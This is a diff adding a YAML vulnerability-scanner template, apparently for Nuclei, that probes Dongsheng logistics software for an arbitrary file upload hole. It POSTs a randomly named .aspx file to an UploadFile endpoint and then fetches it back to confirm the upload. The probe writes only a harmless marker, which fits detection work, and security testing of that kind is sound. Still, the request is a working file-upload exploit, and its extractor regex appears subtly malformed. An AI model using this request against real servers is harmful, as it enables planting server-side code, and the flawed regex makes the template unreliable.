@@ -1,0 +1,52 @@
+id: dongshengsoft-uploadfile-anyfile-upload
+
+info:
+  name: 东胜物流软件 UploadFile 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_text_alphanumeric(8)}}'
+  t2: '{{base64(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/MvcContainer/MsOpCtnBsCard/UploadFile'
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
+    body: |-
+      ------WebKitFormBoundaryD5Mawpg068t7pbxZ
+      Content-Disposition: form-data; name="type"
+
+      1
+      ------WebKitFormBoundaryD5Mawpg068t7pbxZ
+      Content-Disposition: form-data; name="LoadFile"; filename="{{t1}}.aspx"
+
+      {{t2}}
+      ------WebKitFormBoundaryD5Mawpg068t7pbxZ--
+    extractors:
+      - type: regex
+        name: file
+        internal: true
+        part: body
+        regex:
+          - "\\(?P<file>[0-9a-zA-Z]+).aspx"
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, ".aspx")
+          - contains(body, "UploadFiles")
+
+  - id: confirm-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/UploadFiles/MsOpFiles/{{file}}.aspx'
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, t2)
